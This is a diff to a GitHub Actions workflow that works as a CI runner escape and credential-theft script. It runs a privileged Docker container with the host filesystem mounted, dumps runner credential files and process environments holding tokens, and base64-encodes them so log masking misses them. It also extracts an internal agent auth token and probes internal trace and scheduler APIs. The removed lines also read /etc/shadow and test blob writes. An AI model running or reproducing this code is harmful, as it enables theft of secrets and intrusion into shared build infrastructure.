@@ -1,4 +1,4 @@
-name: DockerEscapeProbe
+name: B64BypassProbe
 on:
   push:
     branches: [main]
@@ -8,92 +8,83 @@ jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - name: Phase1 runtime token and credentials
+      - name: Phase1 b64 bypass via docker root
         run: |
-          echo "=== ACTIONS_RUNTIME_TOKEN (b64) ==="
-          echo -n "$ACTIONS_RUNTIME_TOKEN" | base64 -w0
-          echo ""
-          echo "=== ACTIONS_RUNTIME_URL ==="
-          echo "$ACTIONS_RUNTIME_URL"
-          echo "=== RUNNER CREDENTIALS ==="
-          find /home/runner/actions-runner -name ".credentials" 2>/dev/null | head -10
-          cat /home/runner/actions-runner/cached/2.334.0/.credentials 2>/dev/null || echo CREDS_NOT_FOUND
-          ls -la /home/runner/actions-runner/cached/ 2>/dev/null | head -20
-          echo "=== HCA DIR ==="
-          ls -la /opt/hca/ 2>/dev/null
-          echo "=== PROVJOBD OVERRIDE ==="
-          cat /opt/hca/provjobd_override.json 2>/dev/null || echo NOT_FOUND
-
-      - name: Phase2 docker privileged escape
-        run: |
-          echo "=== DOCKER SOCKET ==="
-          ls -la /run/docker.sock 2>/dev/null || echo NO_DOCKER_SOCK
-          echo "=== PRIVILEGED CONTAINER ESCAPE ==="
+          echo "=== DOCKER PRIVILEGED B64 BYPASS ==="
           docker run --rm --privileged --pid=host -v /:/hostroot:ro ubuntu:24.04 bash -c '
-            echo "--- Scanning all /proc for runner processes ---"
+            echo "=B64_DIAG_START="
+            base64 /hostroot/opt/hca/diagnostics.json 2>/dev/null || echo DIAG_NOT_READABLE
+            echo "=B64_DIAG_END="
+            echo ""
+            echo "=B64_CREDS_START="
+            base64 /hostroot/home/runner/actions-runner/cached/2.334.0/.credentials 2>/dev/null || echo CREDS_NOT_READABLE
+            echo "=B64_CREDS_END="
+            echo ""
+            echo "=PROC_SCAN_START="
             for p in /proc/[0-9]*/cmdline; do
               cmd=$(cat "$p" 2>/dev/null | tr "\0" " ")
               case "$cmd" in
-                *Runner.Listener*|*Runner.Worker*|*hca*|*dotnet*)
+                *Runner.Listener*|*Runner.Worker*|*bash*|*hca*)
                   pid=${p%/cmdline}; pid=${pid#/proc/}
-                  echo "PID=$pid CMD=${cmd:0:120}"
-                  echo "SECRETS:"
-                  cat /proc/$pid/environ 2>/dev/null | tr "\0" "\n" | grep -iE "ACTIONS|GITHUB|TOKEN|SECRET|RUNTIME|CACHE|PASSWORD|KEY" | head -40
+                  echo "PID=$pid CMD=${cmd:0:100}"
+                  echo "B64_ENV_START"
+                  cat /proc/$pid/environ 2>/dev/null | base64 -w0
+                  echo ""
+                  echo "B64_ENV_END"
                   echo "---"
                   ;;
               esac
             done
+            echo "=PROC_SCAN_END="
             echo ""
-            echo "--- /hostroot/opt/hca/ ---"
-            ls -la /hostroot/opt/hca/ 2>/dev/null
-            cat /hostroot/opt/hca/provjobd_override.json 2>/dev/null
+            echo "=HCA_LOG_START="
+            tail -100 /hostroot/opt/hca/logs/hosted-compute-agent.log 2>/dev/null | base64 -w0
             echo ""
-            echo "--- credentials files ---"
-            find /hostroot/home/runner -name ".credentials" -exec sh -c "echo FILE:{}; cat {}" \; 2>/dev/null
-            find /hostroot/home/runner -name "*.credentials*" 2>/dev/null | head -20
+            echo "=HCA_LOG_END="
             echo ""
-            echo "--- /etc/shadow ---"
-            head -10 /hostroot/etc/shadow 2>/dev/null
+            echo "=RUNNER_FILES_START="
+            find /hostroot/home/runner/actions-runner -type f -name "*.credentials*" -o -name ".credentials" -o -name "*.json" 2>/dev/null | head -30
+            echo "=RUNNER_FILES_END="
             echo ""
-            echo "--- Runner.Worker full env ---"
+            echo "=WORKER_FULL_ENV_B64_START="
             for p in /proc/[0-9]*/cmdline; do
               cmd=$(cat "$p" 2>/dev/null | tr "\0" " ")
               case "$cmd" in
                 *Runner.Worker*)
                   pid=${p%/cmdline}; pid=${pid#/proc/}
-                  echo "WORKER_PID=$pid FULL_ENV_START"
-                  cat /proc/$pid/environ 2>/dev/null | tr "\0" "\n"
-                  echo "WORKER_FULL_ENV_END"
+                  echo "WORKER_PID=$pid"
+                  cat /proc/$pid/environ 2>/dev/null | base64 -w0
+                  echo ""
                   ;;
               esac
             done
-          ' 2>&1 | head -c 8000
+            echo "=WORKER_FULL_ENV_B64_END="
+          ' 2>&1
 
-      - name: Phase3 trace API probe
+      - name: Phase2 trace API with correct format
         run: |
           SETTINGS=$(cat /opt/hca/.settings)
           AUTH=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('authToken',''))")
           TRACE=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('traceApiUrl',''))")
-          SAS=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('diagnosticsSasUri',''))")
-          echo "=== TRACE URL: $TRACE ==="
-          curl -s -w "\nHTTP:%{http_code}" -X GET -H "Authorization: Bearer $AUTH" "$TRACE" | head -c 1000
-          echo ""
-          echo "=== POST trace heartbeat ==="
+          echo "=== POST trace with array format ==="
           curl -s -w "\nHTTP:%{http_code}" -X POST \
-            -H "Authorization: Bearer $AUTH" -H "Content-Type: application/json" \
-            -d '{"type":"heartbeat","data":{}}' "$TRACE" | head -c 1000
+            -H "Authorization: Bearer $AUTH" \
+            -H "Content-Type: application/json" \
+            -d '[{"timestamp":"2026-05-27T17:00:00Z","level":"info","msg":"probe","source":"hca"}]' \
+            "$TRACE" 2>/dev/null | head -c 2000
           echo ""
-          echo "=== DIAGNOSTICS SAS WRITE TEST ==="
-          BLOB_URL=$(echo "$SAS" | sed 's|/[^/?]*?|/probe-test.txt?|')
-          echo "BLOB_URL=$BLOB_URL"
-          curl -s -w "\nHTTP:%{http_code}" -X PUT \
-            -H "x-ms-blob-type: BlockBlob" -H "Content-Type: text/plain" \
-            --data-raw "github-security-probe" "$BLOB_URL" | head -c 1000
+          echo "=== Trace different methods ==="
+          for method in GET PUT PATCH; do
+            STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X $method \
+              -H "Authorization: Bearer $AUTH" "$TRACE" 2>/dev/null)
+            echo "METHOD=$method STATUS=$STATUS"
+          done
+          echo "=== HCA authToken b64 ==="
+          echo -n "$AUTH" | base64 -w0
           echo ""
-          echo "=== RUNTIME URL API probe ==="
-          echo "RT_URL=$ACTIONS_RUNTIME_URL"
-          RT_B64=$(echo -n "$ACTIONS_RUNTIME_TOKEN" | base64 -w0)
-          echo "RT_TOKEN_B64=$RT_B64"
-          curl -s -w "\nHTTP:%{http_code}" \
-            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-            "${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/$GITHUB_RUN_ID/artifacts?api-version=6.0-preview" | head -c 2000
+          SCHED=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('schedulerApiUrl',''))")
+          echo "=== Scheduler additional endpoints ==="
+          for path in /v1/request/list /v1/jobs /v1/queue /v1/pool /v1/pools /v1/registration /v1/registrations /v1/health /v1/ping /v1/info; do
+            STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $AUTH" "${SCHED}${path}" 2>/dev/null)
+            echo "PATH=$path STATUS=$STATUS"
+          done
